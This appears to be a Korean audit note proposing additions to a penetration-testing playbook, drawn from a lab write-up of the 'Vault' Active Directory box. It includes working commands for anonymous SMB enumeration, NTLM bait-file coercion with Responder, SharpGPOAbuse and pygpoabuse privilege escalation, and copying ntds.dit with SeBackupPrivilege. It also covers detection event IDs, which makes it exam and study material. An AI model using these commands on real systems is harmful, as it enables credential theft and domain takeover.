---
tags:
  - type/audit
  - platform/pg
manual_tags: true
---
# Vault — `_PLAYBOOK` 이관 제안

대상 노트 `03. PG\Vault.md`(1229행 → 1089행) · 백업 `03. PG\_backup\Vault.md.bak`

⛔ **이 파일은 제안이다. `_PLAYBOOK.md` 는 단독 기록자(`pg-line-manager`)가 반영한다.**
⛔ **신규 항목은 번호를 비워 두었다.** 번호는 충돌을 보고 기록자가 배정할 것. 노트 본문에는 신규 항목 앵커를 걸지 않았다.

## 검산 — 삭제 / 이관

| 원본 장 | 원본 행범위 | 삭제 행수 | 이관처 |
|---|---|---:|---|
| `0. 이 박스에서 배우는 것` | 38–59 | 22 | B-①②③ |
| `2-8. 강제 인증 공격을 언제 꺼내는가` | 458–486 | 29 | B-① |
| `6. 막혔던 지점 / 시행착오` | 911–1136 | 226 | A-①~⑥ · A-4-15 병합 · D-① · 일부는 노트 본문 잔류 |
| `7. OSCP 시험 관점` | 1139–1181 | 43 | C-① · B-②③ |
| `8. 방어 관점` | 1184–1197 | 14 | **노트 본문**의 두 `Vulnerability Fix:` 로 흡수(이관 아님) |
| **삭제 합계** | | **334** | |

**이관 제안 11건** — A 6건 + A-4-15 병합 1건 + B 3건 + C 1건 + D 1건 = 12블록(A-4-15 병합 포함).
**전량 원문은 이 파일 부록에 인용해 두었다** — 삭제 334행이 한 줄도 사라지지 않았음을 그것으로 검산할 것.

**이관하지 않고 노트 본문 finding 절에 «녹인» 것**(따라서 손실이 아님):
- §6-10 SMB1 오류 오독 → `Service Enumeration` 의 공유 열거 산문
- §6-8 전송 후 `ls` 로 세기 → `Initial Access` 재현 절의 mput 문단
- §6-7 DCSync 배제 근거(`jq` GetChanges 블록 전량) → `Privilege Escalation` 절
- §6-9 potfile 이 히스토리를 이긴다 → `Initial Access` 재현 절의 크랙 문단
- §8 방어 관점 7행 표 + 탐지 문단 → 두 finding 의 `Vulnerability Fix:`
- §2-8 「신호 → 판단」 표 → B-① 로 이관(노트에는 남기지 않음)

⚠️ **행수가 1229 → 1089 로 140행만 줄어든 이유** — 334행을 지우면서 동시에 아래를 **복원·추가**했음:
- nmap raw 전문 복원(`...` 절단 제거, TCP `-p-` 원문 3052바이트 전량) · UDP 원문 422바이트 전량
- `ntlm_theft` 생성 출력과 `mput` 출력의 `...` 절단 복원(원본 git 최초판 `15671e5` 기준으로 되살림)
- BloodHound `jq` 출력 전문화(이전 판은 코드펜스 «안»에 한국어/영어 주석 `# -512 Domain Admins` 를 넣고 `...` 로 잘랐음 — 표준 위반)
- SharpGPOAbuse **실패 2회** 복원(스크린샷에만 있던 것)
- 작업 시각 복원표 · 플래그 값 불일치 서술 · 공유가 비어 있었던 관측 — 전부 신규

---

## A. 증상별 — 제안

### A-① 익명 SMB 접근 표기를 하나만 시도하고 「익명 불가」로 판단했다

**판정: 신규.** 「익명 SMB」 증상으로 `_PLAYBOOK` 을 검색했으나 `B-27`(익명 «읽기» 공유가 웹루트인지)과 `B-55 ⑷`(널 세션은 «한 번만» 확인)뿐이라 이 증상을 덮지 않음. 오히려 `B-55 ⑷` 와 **결이 반대**이므로 두 항목을 상호 링크해 둘 것.

**넣을 본문:**

> **증상** — `smbclient -L <IP> -N` 하나만 쳐보고 실패해 익명 경로를 배제함.
>
> **서버마다 「익명」을 받는 계정 이름이 다름.** 최소 넷을 다 던질 것:
>
> ```bash
> smbclient //IP/share -N            # null 세션
> smbclient //IP/share -U ''         # 빈 사용자
> smbclient //IP/share -U 'guest'
> smbclient //IP/share -U 'anonymous'
> smbmap -H IP -u anonymous          # -u '' -p '' · -u guest 도
> nxc smb IP -u '' -p '' --shares    # -u guest -p '' 도
> ```
>
> | 표기 | 실제 인증 | 서버가 보는 것 |
> |---|---|---|
> | null 세션(`-N`) | 사용자명·비밀번호 둘 다 빈 문자열 | `ANONYMOUS LOGON`(S-1-5-7) |
> | 빈 사용자(`-U ''`) | 사용자명 빈 문자열 | 대개 null 세션과 같게 처리 |
> | `guest` | `Guest` 계정(활성화돼 있으면) | `<도메인>\Guest` |
> | `anonymous` | 문자 그대로 그런 이름의 사용자 | 계정이 없으면 실패, Guest 로 매핑되기도 |
>
> 구형 Windows(2000/2003)는 null 세션에 사용자 목록·그룹·비밀번호 정책까지 열어줬고(`RestrictAnonymous=0`), 현대 Windows 는 대부분 막았음. 그래도 **공유별 ACL 이 `Everyone`/`ANONYMOUS LOGON` 에 열려 있으면 익명 읽기·쓰기가 그대로 성립함.**
>
> [[Vault]] 실측 — `~/.zsh_history` 에 익명 표기 시도가 **13줄** 남아 있고 통한 것은 **`-N` 과 `-U ''` 둘뿐**임. 나머지는 헛발질처럼 보이나 필요한 확인이었음. 이것을 스크립트화한 것이 `nxc-sweep`.
>
> ⚠️ **`smbclient -L <IP>/<공유>` 는 문법이 틀림** — `-L`(공유 나열)은 호스트만 받음. [[Vault]] 히스토리에 `smbclient -L 192.168.120.172/DocumentsShare` 계열이 **5회** 있음. 공유에 들어갈 때는 `-L` 없이 `smbclient //IP/공유`.
>
> ⚠️ **`smbmap` 의 `WRITE` 표기를 믿되 한 번은 실제로 올려볼 것** — 공유 권한이 WRITE 인데 NTFS 권한이 READ 면 실패함. [[Vault]] 는 5바이트 `test.txt` 를 실제로 `put` 해 확정했음.

### A-② 「노트에 적어둔 플래그 값」을 나중에 제출하려다 값이 달라져 있다

**판정: 신규.** 「플래그 값이 다르다」로 검색했으나 관련 항목 없음. 기존 볼트 규율(「플래그는 인스턴스마다 재생성」)은 **인스턴스 사이**를 말하는데, 이 사례는 **한 세션 안**임.

**넣을 본문:**

> **증상** — 같은 인스턴스처럼 보이는데 `proof.txt` 를 두 번 읽었더니 값이 다름.
>
> [[Vault]] 실측 — 같은 파일(`C:\Users\Administrator\Desktop\proof.txt`)을 **17분 간격**으로 두 경로에서 읽었고 값이 달랐음:
>
> | 붙여넣기 시각 | 경로 | 값 |
> |---|---|---|
> | 13:23:20 | GPO → evil-winrm Administrator | `714b4d1566a4bc88b9a0f45c33b36f0b` |
> | 13:40:45 | utilman 치환 → RDP SYSTEM | `74a1ddd00c6d187cf4f787c14d5cbde1` |
>
> 두 값 모두 스크린샷 실측이고 한 글자씩 대조했음(`파일보관\Pasted image 20260708132320.png` · `…134045.png`). 그 사이에 인스턴스가 재시작·초기화됐다는 뜻이겠으나 **확정할 근거가 산출물에 없음** `[가정]`.
>
> → **플래그는 읽은 «그 순간에» 제출할 것.** 노트에 옮겨 적었다가 나중에 제출하면 이미 다른 값일 수 있음.
> → 같은 이유로 **`whoami; hostname; ipconfig; date; type <플래그>` 한 화면**을 그 자리에서 파일로 떨어뜨릴 것 — 값만 33바이트 적어두면 「언제·어느 세션에서」가 통째로 사라짐.

### A-③ 도구가 `Unknown argument error` 만 뱉고 어느 인자가 틀렸는지 안 알려준다

**판정: 신규.**

**넣을 본문:**

> **증상** — `.exe`/스크립트가 `[!] Unknown argument error.` 한 줄로 죽고 끝. 어느 옵션이 문제인지 표시가 없음.
>
> [[Vault]] 실측 — SharpGPOAbuse 를 **세 번** 쳐서 통과했음(`파일보관\Pasted image 20260708132007.png`):
>
> ```powershell
> .\SharpGPOAbuse.exe --AddlocalAdmin --GPO "Default Domain Policy" -- UserAccount anirudh
> [!] Unknown argument error.
> [!] Exiting...
> .\SharpGPOAbuse.exe --AddlocalAdmin --GPO "Default Domain Policy" --UserAccount anirudh
> [!] Unknown argument error.
> [!] Exiting...
> .\SharpGPOAbuse.exe --AddlocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh
> [+] Domain = vault.offsec
> ```
>
> 첫 줄은 두 군데가 동시에 틀렸음 — `-- UserAccount`(하이픈 뒤 공백)와 **`--GPO`(정답은 `--GPOName`)**. 하나씩 고치면 왕복이 그만큼 늘어남.
>
> → **오류가 「어느 인자」를 안 알려주면 옵션을 하나씩 고치지 말고 `--help`/README 로 «전체 목록»을 먼저 받을 것.** 이름이 자연스러워 보이는 축약형(`--GPO`)은 실제로 없는 경우가 많음.
> → **통과한 문자열을 그대로 노트에 적고 「보기 좋게」 고치지 말 것.** [[Vault]] 에서 실제로 통과한 것은 `--AddlocalAdmin`(l 이 소문자)인데 이전 판 노트가 `--AddLocalAdmin` 으로 «정리»해 실측이 훼손돼 있었음.

### A-④ 앞 박스의 IP 가 명령에 잔류해 엉뚱한 타겟을 친다

**판정: 병합.** 기존 `A-65. 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다` 아래에 append 권장(같은 「IP 를 틀리게 쓴다」 계열). **절 제목은 바꾸지 말 것.**

**넣을 본문:**

> **인접 사례 — 「리버트로 IP 가 바뀌는 것」이 아니라 「앞 박스 IP 가 손가락에 남는 것」.**
>
> [[Vault]] 실측 — 타겟은 `.172` 인데 `.175`([[Resourced]]의 IP)를 친 명령이 `~/.zsh_history` 에 **6줄** 남아 있음:
>
> ```bash
> enum4linux-ng -A 192.168.120.175
> nxc smb 192.168.120.175 -u '' -p '' --shares
> ldapsearch -x -H 'ldap://192.168.120.175' -s base namingcontexts
> impacket-GetNPUsers vault.offsec/ -userfile users.txt -no-pass -dc-ip 192.168.120.175
> nxc smb 192.168.120.175 -u 'anirudh' -p 'SecureHM' --shares
> nxc-sweep 192.168.120.175 -u 'anirudh' -p 'SecureHM'
> ```
>
> 뒤의 두 줄이 특히 비쌈 — **크랙한 자격증명을 엉뚱한 박스에 던진 것**이라 「자격증명이 안 통한다」로 오독하기 딱 좋음(A-24 와 겹치는 함정). 나중에 `.172` 로 고쳐 다시 친 흔적이 히스토리에 그대로 있음.
>
> → **박스마다 `mkdir <박스>; cd <박스>; nnmap <IP>` 로 시작할 것.** `nmap.log` 가 그 디렉터리의 정답 IP 가 되어 잔류를 잡아줌.
> → 같은 뿌리의 사고가 [[Heist]] 에도 있음.

### A-⑤ AS-REP 로스팅이 빈손이다 — 「옵션 이름」과 「대상 존재」를 나눠서 볼 것

**판정: 병합.** 기존 `B-55 ⑷ 자격증명 «0개» 상태의 우선순위` 의 AS-REP 줄에 붙이는 것이 자연스러움. 증상 진입이 필요하다고 판단되면 A 절 신규로.

**넣을 본문:**

> [[Vault]] 실측 — 두 가지가 동시에 틀려 있었음.
>
> **① 옵션 이름이 틀림.** Kali 에서 실제 usage 를 확인함:
>
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ impacket-GetNPUsers -h | grep -i usersfile
>   -usersfile USERSFILE  File with user per line to test
> ```
>
> **`-usersfile`(s 가 붙음)** 임. 히스토리에 남은 것은 `-userfile` 이라 인자 파싱에서 거부됨. ⚠️ **구체적 오류 문구는 히스토리에 없어 관측된 것이 아님.**
>
> **② 옵션을 고쳤어도 결과는 없었음.** BloodHound 수집분이 답을 줌:
>
> ```bash
> ┌──(kali㉿kali)-[~/PG/Vault]
> └─$ jq -r '.data[].Properties | select(.dontreqpreauth==true) | .samaccountname' 20260708124927_users.json
> (출력 없음)
> ```
>
> `DONT_REQ_PREAUTH` 가 켜진 계정이 **하나도 없음.** 게다가 그 시점엔 `-usersfile` 에 넣을 유효한 사용자 목록조차 없었음(SMB 열거 전).
>
> → **AS-REP 로스팅은 ⑴ 유효한 사용자명 목록과 ⑵ 그중 사전인증 비활성 계정, 둘 다 있어야 성립함.** 하나만 없어도 빈손임. 공짜라 먼저 때려보는 것 자체는 옳으나 **「빈손」을 「내가 틀렸다」로 읽지 말 것.**
> → 자격증명을 하나 얻은 뒤에는 **BloodHound JSON 의 `dontreqpreauth` 로 5초 만에 확정**할 수 있음 — 다시 브루트할 필요 없음.

### A-⑥ 자동 열거 도구를 «기다리다» 시간을 태운다 / 출력이 안 남아 나중에 못 쓴다

**판정: 병합.** 기존 `A-18. 배경 스캔이 도는데 같은 스캔을 손으로 또 돌렸다` 의 **반대 사례**로 append.

**넣을 본문:**

> **반대 방향의 실패 — 자동 열거를 던져놓고 «그것을 기다리는» 것.**
>
> [[Vault]] 실측 — `enum4linux-ng -A` 와 익명 `ldapsearch` 두 경로를 실제로 던졌음:
>
> ```bash
> ┌──(kali㉿kali)-[~/PG/Vault]
> └─$ enum4linux-ng -A 192.168.120.175      # ← IP 오타(.175), 뒤에 .172 로 정정
> ┌──(kali㉿kali)-[~/PG/Vault]
> └─$ enum4linux-ng -A 192.168.120.172
> ldapsearch -x -H 'ldap://192.168.120.172' -s base namingcontexts
> ldapsearch -x -H 'ldap://192.168.120.172' -b "dc=vault,dc=offsec"
> ```
>
> `enum4linux-ng -A` 는 SMB 공유·RID 브루트·LDAP·비밀번호 정책을 한 명령으로 묶음("all simple enumeration"). `ldapsearch` 쪽은 `-s base namingcontexts` 로 도메인 DN 을 먼저 확인한 뒤 트리를 익명 덤프하는 표준 기법이고 **경로 자체는 옳음** — `description` 필드에 비밀번호가 박힌 계정을 찾는 수임(B-51).
>
> ⚠️ **이 네 명령의 출력은 어디에도 남지 않아 무엇을 얻었는지 단정할 수 없음 — 관측된 것이 아님.** 확정적인 것은 이어서 `smbclient` 로 `DocumentsShare` 를 직접 판 것이 답이었다는 사실뿐임.
> ⚠️ 히스토리에 `ldapsearch -x -H 'ldap://192.168.120.175\` 로 **줄 끝 백슬래시가 다음 줄과 연속**된 흔적도 있음 — 인용부호·줄 끝 `\` 함정은 `A-3-12`.
>
> → **자동 열거는 백그라운드로 던지고 그동안 `smbclient -L`·`smbmap` 으로 손으로 팔 것.** RID 브루트가 특히 느리고 출력이 길어 핵심을 놓치기 쉬움.
> → **그리고 출력을 파일로 떨어뜨릴 것.** 터미널에서 읽고 버리면 사후에 「배제했는가 / 못 해봤는가」를 구분할 수 없게 됨 — 이 박스에서 실제로 그렇게 됐음.

### A-4-15 병합 — 「관리자 그룹에 넣었는데 파일이 «안 읽힌다»」도 같은 항목에

**판정: 병합.** 기존 `A-4-15. 관리자 그룹에 넣었는데 whoami /priv 가 초라하다 — UAC 원격 토큰 필터링` 끝에 append. **절 제목은 바꾸지 말 것.**

**넣을 본문:**

> **한 단계 앞의 증상을 먼저 배제할 것 — 「재로그온을 안 한 것」.**
>
> 그룹 멤버십은 **토큰 발급 시점에 스탬프**됨. `net localgroup administrators` 에 이름이 보여도 **현재 세션의 토큰은 옛것**이라 관리자 파일 접근이 거부됨. 세션을 끊고 다시 붙으면 새 토큰에 반영돼 그대로 읽힘.
>
> [[Vault]] 실측 — GPO 로 로컬 관리자를 심고 `gpupdate /force` 를 친 뒤 `net localgroup administrators` 에 `anirudh` 가 보였으나, **evil-winrm 세션을 새로 연 뒤에야** `C:\Users\administrator\desktop\proof.txt` 가 읽혔음(`파일보관\Pasted image 20260708132134.png` → `…132320.png`).
>
> **판별 순서:**
> 1. 세션을 **끊고 다시 붙음** → 읽히면 그냥 토큰 문제였음(여기서 끝)
> 2. 그래도 `whoami /priv` 가 초라하면 → 이 절 본문(UAC 원격 토큰 필터링)
>
> → **1번을 건너뛰고 UAC 로 의심하면 `LocalAccountTokenFilterPolicy` 를 건드리는 등 불필요한 변경을 하게 됨.**

---

## B. 기법 카드 — 제안

### B-① 쓰기 가능한 SMB 공유는 저장소가 아니라 «자격증명 덫»이다 — 강제 인증(coerced auth)

**판정: 신규.** 「강제 인증」·「Responder」·「ntlm_theft」·「NetNTLMv2」로 `_PLAYBOOK` 전문 검색 → **0건.** 기존 `B-27` 은 «익명 읽기» 공유가 웹루트인지를 다루므로 다른 카드. `B-27` 끝에 「쓰기가 보이면 B-<신규>」 상호 링크를 걸어줄 것.

**넣을 본문:**

> **`smbmap`/`nxc --shares` 출력에 `WRITE` 가 보이면 그 자리에서 미끼 공격을 계획할 것.** 다른 취약점을 찾을 필요 없이 그것이 진입로일 확률이 높음.
>
> **왜 통하는가** — Windows 탐색기(또는 인덱싱 서비스·백신·미리보기 핸들러)가 폴더를 열면 그 안의 특정 파일이 원격 리소스를 자동으로 가져오려 시도함. 그 대상을 **내 Kali 의 UNC 경로**로 지정해 두면 가져오는 과정에서 SMB 인증이 나가고 그것이 NetNTLMv2 임. **사용자가 파일을 「실행」하거나 「열」 필요조차 없음** — 어떤 미끼는 폴더를 여는 것만으로 발동함.
>
> **성립 조건 둘** — ⑴ 내가 UNC/URL 을 심을 수 있는 곳 ⑵ 그것을 열거나 처리하는 Windows 프로세스.
>
> | 열거 중 이것을 보면 | 강제 인증을 의심 |
> |---|---|
> | 익명/게스트 **쓰기** 가능 공유(`smbmap` 의 `WRITE`) | ★ 미끼 파일 투하 → Responder ([[Vault]]) |
> | 웹앱의 URL 입력·이미지 프록시·PDF 렌더러·웹훅 테스트 | ★ `?url=<KALI>` → Responder ([[Heist]]) |
> | 사용자 프로필/홈 디렉터리에 쓰기 가능 | `.url`·`desktop.ini` 를 프로필 루트에 |
> | MSSQL 접근권 | `EXEC xp_dirtree '\\<KALI>\x'` → 서비스 계정 해시 |
> | 프린터 스풀러(RPC) 열림 | PrinterBug(`SpoolSample`)·PetitPotam — **DC 가 나에게 인증하도록 강제** |
> | 아무 인증 실마리도 없는 AD 박스 | LLMNR/NBT-NS 포이즈닝(Responder 수동 대기) |
>
> **절차 3줄:**
> ```bash
> python3 ntlm_theft.py -g all -s <KALI-IP> -f steal
> smbclient //IP/<share> -N -c 'prompt OFF; mput *'
> sudo responder -I tun0
> ```
> - `-s` 는 **IP 로** — 호스트명을 넣으면 타겟이 해석해야 하는데 타겟 DNS 에 내 Kali 가 없음. 반대로 LLMNR 포이즈닝을 노린다면 **존재하지 않는 호스트명**을 넣어 Responder 가 그 이름을 가로채게 하는 전술도 있음
> - `prompt OFF` 가 없으면 `mput` 이 파일마다 y/n 을 물어 24번 멈춤
> - `-I` 는 **인터페이스 이름**임. IP 를 넣으면 안 됨([[Vault]] 히스토리에 `sudo responder -I 192.168.45.175` → `-I tun0` 정정 흔적)
>
> **미끼는 발동 조건이 제각각이라 `-g all` 로 24종을 전부 뿌림.** 폴더를 여는 것만으로 발동하는 것이 가장 강함 — `desktop.ini`(폴더 아이콘·툴팁 정의 시스템 파일, 진입 시 무조건 읽힘) · `.scf`(`IconFile=\\<KALI>\…` 필드를 아이콘 렌더 시점에 확인) · `.url`/`.lnk`/`.library-ms`/`Autorun.inf`. 나머지는 Office 문서(원격 이미지·템플릿·스타일시트 페치)와 미디어·핸들러 계열.
>
> **미끼가 안 물면** — ⑴ Responder 배너의 `SMB server [ON]` ⑵ `-s` 와 Responder 바인딩 IP 일치(VPN 재연결이 1순위 원인) ⑶ `ls` 로 업로드 개수 확인 ⑷ **공유가 비워졌는지** — [[Vault]] 에서 캡처 10분 뒤 공유가 비어 있었음 `[가정]` ⑸ 실전이면 사용자를 유도해야 함(랩은 시뮬레이션이 대신 열어줌).
>
> **얻은 다음의 갈림길 — 캡처인가 릴레이인가.** 즉시 `nmap` 의 `smb2-security-mode` 를 다시 볼 것:
> - `signing enabled and **required**` → 릴레이 불가 → **크랙**([[Vault]]·[[Heist]])
> - `signing enabled but **not required**` + **다른 호스트 존재** → **릴레이**(`ntlmrelayx`)가 훨씬 강함. 컴퓨터 계정처럼 크랙 불가능한 인증도 릴레이는 그대로 씀
>
> 단일 호스트 랩은 릴레이 대상이 없어 항상 크랙임. **시험 AD 세트(DC 1 + 멤버 2~3)에서 이 판단이 갈림** — 멤버 서버의 서명이 꺼져 있으면 DC 의 인증을 그 멤버로 릴레이해 로컬 관리자를 얻음.
>
> **캡처 blob 이 진입 벡터를 증언함** — `MsvAvTargetName`(AV_PAIR id 9)이 `cifs/…` 면 SMB, `HTTP/…` 면 웹 페치가 트리거였음. 디코더는 [[Vault]] 노트에 있음.
> ⚠️ blob 안의 `NbComputerName`·`DnsComputerName` 은 **Responder 가 무작위로 만든 가짜 서버 신원**임 — 타겟 도메인으로 착각하지 말 것. hashcat 이 쓰는 도메인은 **콜론 3번째 필드**임.
> ⚠️ **해시를 한 글자도 편집하지 말 것** — 사용자명·도메인·blob 이 전부 HMAC 입력이라 도메인을 FQDN 으로 바꿔 적거나 줄바꿈이 끼면 **정답 비밀번호로도 실패함.**
> ⚠️ NetNTLMv2 는 **반복 없는 HMAC-MD5 2회**라 stretching 이 없음 — CPU 만으로 rockyou 를 수십 초에 완주함. **완주하고도 안 깨지면 규칙(`-r best64.rule`)을 붙이거나 다른 경로로 갈 것.** 여기서 오래 붙잡는 것이 시험 시간 낭비 1위임. 모드는 `-m 5600`(AS-REP `-m 18200` · Kerberoast TGS-REP `-m 13100` 과 혼동 금지).
>
> **이 카드가 가르치는 반사** — 「웹이 없다 → 막다른 길」이 아니라 **「웹이 없다 → SMB 쓰기 공유를 찾아라 → 있으면 강제 인증」**. 진입로가 안 보이는 AD 박스에서 이 사고 하나가 시간을 가장 많이 아낌.

### B-② GPO 쓰기 권한 = 그 GPO 가 적용되는 모든 머신에서 SYSTEM

**판정: 신규.** 「GPO」·「SharpGPOAbuse」·「gpupdate」로 전문 검색 → **0건.** 기존 `B-54` 는 «컴퓨터 객체» ACE(RBCD·Shadow Credentials)라 무기화 도구가 다름. `B-54` 에 상호 링크 권장.

**넣을 본문:**

> **BloodHound 에서 GPO 에 `GenericWrite`/`WriteDacl`/`WriteOwner` 가 걸린 것을 보면 SharpGPOAbuse.**
>
> GPO 는 두 곳에 나뉘어 저장됨 — **GPC**(LDAP `CN={GUID},CN=Policies,CN=System,…`, 메타데이터·`versionNumber`)와 **GPT**(SYSVOL `\\<도메인>\SysVol\<도메인>\Policies\{GUID}\`, 실제 설정 파일). GPO 쓰기 권한이란 결국 **SYSVOL 의 `GptTmpl.inf` 를 고칠 수 있다**는 뜻임.
>
> 고칠 수 있는 것 중 무기가 되는 셋:
> - **제한된 그룹(Restricted Groups)** — 「이 컴퓨터의 로컬 Administrators 에 X 를 넣어라」 ← `--AddLocalAdmin`
> - **즉시 예약 작업(Immediate Scheduled Task)** — 「SYSTEM 으로 이 명령을 실행하라」 ← `--AddComputerTask`
> - 로그온/시작 스크립트
>
> **`Default Domain Policy` 는 도메인 루트에 링크돼 DC 를 포함한 모든 머신에 적용됨** → 로컬 관리자를 심으면 DC 의 로컬 관리자 = 도메인 장악.
>
> ```powershell
> .\SharpGPOAbuse.exe --AddlocalAdmin --GPOName "Default Domain Policy" --UserAccount <나>
> gpupdate /force
> net localgroup administrators
> ```
> 그리고 **세션을 끊고 다시 붙을 것**(A-4-15).
>
> **`GptTmpl.inf` 에는 이름이 아니라 SID 로 기록됨:**
> ```ini
> [Group Membership]
> *S-1-5-32-544__Members = *<대상 SID>
> ```
> `S-1-5-32-544` 가 로컬 Administrators 의 잘 알려진 SID 임. 도구가 `SID Value of <계정>` 을 먼저 계산하는 이유가 이것임.
>
> **두 버전 번호를 반드시 함께 올릴 것.** 클라이언트는 GPC 와 GPT 의 버전을 «비교»해 정책이 바뀌었는지 판단함 — 하나만 올리면 불일치로 무시되거나 오류가 남. **손으로 `GptTmpl.inf` 만 고치고 `versionNumber` 를 안 올리는 것이 가장 흔한 실패임.**
>
> **`WriteOwner`/`WriteDacl` 만 있어도 같은 결과** — 단계가 하나 늘 뿐임(`WriteDacl` → 자신에게 `GenericWrite` 부여 → 공격 / `WriteOwner` → 소유권 탈취 → DACL 수정).
>
> **`--AddComputerTask` 는 재로그온이 불필요함** — 즉시 예약 작업으로 SYSTEM 리버스셸을 바로 띄움. 급하면 이쪽.
>
> **Kali 네이티브 대안 — `pygpoabuse`** (업로드 없음, 흔적 적음):
> ```text
> pygpoabuse.py <도메인>/<계정>:<비번> -gpo-id "<GUID>" -command 'net localgroup administrators <나> /add' -f
> ```
>
> **오설정을 기본 권한 더미에서 골라내는 법** — GPO 의 ACE 를 전부 뽑아 `PrincipalType` 을 볼 것. `Domain Admins`(RID 512)·`Enterprise Admins`(RID 519)는 정상 기본 권한이고 전부 `Group` 임. **`User` 타입 ACE 가 오설정임.**
> ```bash
> jq -r '.data[] | .Properties.name as $n | (.Aces//[])[] | select(.RightName|test("Write")) | [$n,.RightName,.PrincipalSID,.PrincipalType] | @tsv' *_gpos.json
> ```
>
> **탐지·방어** — 이벤트 **5136/5137**(디렉터리 객체 변경)로 `versionNumber`·`gPCMachineExtensionNames` 변경, **4663** 으로 SYSVOL `GptTmpl.inf` 변경. **GPO 의 Restricted Groups 변경은 정상 운영에서 극히 드물어 발생 즉시 조사 대상임.**
>
> **출처** — [[Vault]](`anirudh → GenericWrite/WriteOwner/WriteDacl on Default Domain Policy`. `Default Domain Controllers Policy` 에는 그 엣지가 없었음).

### B-③ 한 계정으로 가는 SYSTEM 경로가 셋일 수 있다 — `whoami /priv` 와 그래프가 «갈림길»이다

**판정: 병합.** 기존 `B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다` 끝에 append 가 자연스러움(그쪽이 「ACL 축」이고 이것이 「특권 축」과의 이분법). 별도 카드가 낫다고 판단되면 B-5 절 신규.

**넣을 본문:**

> **셸을 잡은 첫 1분에 두 명령이 권한상승 방향을 결정함** — `whoami /priv`(특권 기반)와 BloodHound 아웃바운드 엣지(ACL 기반).
>
> | 이러면 | 다음 수 |
> |---|---|
> | 특권이 4개뿐이고 `SeImpersonate`·`SeBackup` 둘 다 없음 | **그래프의 ACL 엣지**를 봄. 특권만으로는 길이 없음([[Heist]] 형) |
> | `SeBackup`/`SeRestore` 가 있음 | 그 자리에서 끝남. 그래프를 볼 필요도 없음([[Vault]] 형) |
> | 그래프에 **GPO** `GenericWrite`/`WriteDacl` | SharpGPOAbuse (B-②) |
> | 그래프에 **사용자/그룹 객체** `GenericAll` | 비밀번호 리셋(`net rpc password`) · Shadow Credentials |
>
> **`SeBackupPrivilege`·`SeRestorePrivilege` 는 대개 «그룹 멤버십»에서 옴.** `Server Operators`·`Backup Operators`·`Print Operators` 는 **BloodHound 가 기본으로 High Value 로 칠하지 않을 수 있음** — `Domain Admins` 만 빨갛게 보고 넘기면 이미 관리자급인 계정을 놓침. **사람 계정이 이 세 그룹 중 하나에 있으면 그 자체로 DC 장악 경로임.**
> ⚠️ 같은 특권이라도 **부여 경로가 다르면 그래프에 보이거나 안 보임** — [[Heist]]의 `svc_apache$` 는 URA(User Rights Assignment)로 직접 받아 그래프에 없었고, [[Vault]]의 `anirudh` 는 그룹 멤버십이라 그래프에 있었음. **그래프에 없다고 특권이 없는 것이 아님.**
>
> **세 경로 우열**([[Vault]] 에서 A·B 를 실제로 완주, C 는 DLL 준비까지):
>
> | | GPO ACL | SeRestore(utilman) | SeBackup(`ntds.dit`) |
> |---|---|---|---|
> | 업로드 | `.exe` 1개 | 없음 | DLL 2개 또는 없음(diskshadow) |
> | 얻는 것 | 그 DC 의 로컬 관리자 | 그 DC 의 SYSTEM | **도메인 전체 해시**(`krbtgt` 포함) |
> | 전제조건 | 없음 | **RDP `nla:False`** | 없음 |
> | 남는 흔적 | GPO Restricted Groups 변경 | `System32` 바이너리 치환 | 임시 파일·섀도카피 |
> | 시험 가치 | 중간 | 낮음 | **가장 높음** — 골든티켓·크로스호스트 PtH 로 확장 |
>
> **「`GetChanges` ACE 가 없다」가 「도메인 해시를 못 얻는다」는 뜻이 아님.** DCSync(DRSUAPI 복제)는 한 방법일 뿐이고 `SeBackupPrivilege` 로 `ntds.dit` 를 직접 읽거나 DC 에서 로컬 관리자·SYSTEM 이 되면 같은 곳에 도달함.
> ⚠️ [[Vault]] 에서 도메인 객체의 `GetChanges`/`GetChangesAll` 은 기본 principal 뿐이었으나 **`BUILTIN\Administrators`(S-1-5-32-544)가 둘 다 가짐** — GPO 로 그 그룹에 들어가면 DCSync 도 성립함(그 박스에서 실제로 시도하지는 않았음).
>
> **`SeBackupPrivilege` → `ntds.dit` 절차** (라이브 파일이라 일반 복사 실패, 두 방법):
> ```powershell
> Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit -Overwrite
> robocopy /b z:\Windows\NTDS C:\temp ntds.dit
> reg save hklm\system C:\temp\system.hive
> ```
> `robocopy` 의 **`/b`(backup mode)를 빠뜨리면 실패함** — `/b` 가 있어야 `SeBackupPrivilege` 를 써서 잠긴 파일을 읽음. 같은 이유로 `Copy-Item` 이 아니라 `Copy-FileSeBackupPrivilege`.
>
> **`gpupdate /force` 의 의미** — 그룹 정책은 기본 **90분(±30분 랜덤)**, DC 는 **5분** 마다 새로고침됨. SYSVOL 을 고쳐도 그 주기가 돌아야 반영되고, `/force` 는 「바뀐 것만」이 아니라 모든 정책을 다시 적용함. **대상 위에 이미 셸이 있어야 칠 수 있음** — 워크스테이션이 대상이면 주기를 기다리거나 재로그온을 유도해야 함.
>
> **`utilman` 치환은 `nla:False` 가 전제임** — NLA 가 켜져 있으면 로그온 화면에 도달하기 전에 인증을 요구하므로 경로가 죽음. `nxc` 의 RDP 줄에 `(nla:False)` 가 찍히는지 먼저 볼 것.

---

## C. 반사 체크리스트 — 제안

### C-① 웹이 없는 Windows/AD 박스를 만나면 — 진입 열거 순서

**판정: 병합.** 기존 `C-1. 정찰 직후` 에 append. `F-1` 포트 표와도 연결됨.

**넣을 본문:**

> **80/443/8080 이 하나도 없는 DC 를 만나면 공격면은 셋뿐임** — SMB(445) · LDAP(389) · Kerberos(88).
>
> ```bash
> smbclient -L //IP -N ; smbmap -H IP -u ''            # ① 익명 공유 — WRITE 가 보이면 즉시 강제 인증
> nxc smb IP -u '' -p '' --users --rid-brute           # ② 사용자 열거
> nxc smb IP -u guest -p '' --shares                   # ③ 게스트
> ldapsearch -x -H ldap://IP -b <baseDN>               # ④ 익명 LDAP (description 필드)
> impacket-GetNPUsers <dom>/ -usersfile u.txt -no-pass # ⑤ AS-REP (사용자 확보 후)
> enum4linux-ng -A IP                                  # ⑥ 위를 묶어 자동화 — 던져놓되 기다리지 말 것
> ```
>
